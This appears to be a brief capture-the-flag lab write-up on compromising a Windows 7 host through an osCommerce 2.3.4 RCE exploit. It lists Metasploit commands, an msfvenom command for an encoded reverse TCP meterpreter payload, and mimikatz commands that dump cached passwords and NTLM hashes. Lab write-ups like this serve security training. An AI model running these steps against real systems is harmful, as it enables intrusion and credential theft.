Summary: Hacking into windows 7 to get NTLM HASH


This room start with scanning the port to find out available service then access the ip:http port to discover that it is running a vulnerable framework called oscommerce 2.3.4

Using searchsploit oscommerce 2.3.4 

To discover that there is a rce vulnerability 

Then use metaspliot 

Msfconsole
Use 43774.py
Options

Set required options and run.

A meterpreter shell will spawn

Getuid
Getpid

To check who are we and what process we are on

Next is to migrate our process into another process that is more stable, we can migrate to svpool



To do this we need to 

Generate a windows tcp reverse shell payload and upload it into the windows system using msfvenom then upload it using first shell we spawn

Msfvenom -p windows/meterpreter/reverse_tcp a -x86 --encoder x86/shikata_ga_nai LHOST=same ip as first shell LPORT= same as first shell -f exe -o anyname.exe

Then

Use multi/handler
Set payload to windows/meterpreter/reverse_tcp
Set lhost
Set lport

Go back to first shell
Upload anyname.exe
Execute -f anyname.exe
CTRL z to background task
Session 2 to go back to multi/handler

New shell should spawn in multi/handler
Load mimikatz
Use Help command if forget commands
creds_all to obtain password stored in memory
lsa_dump_sam to obtain user hash
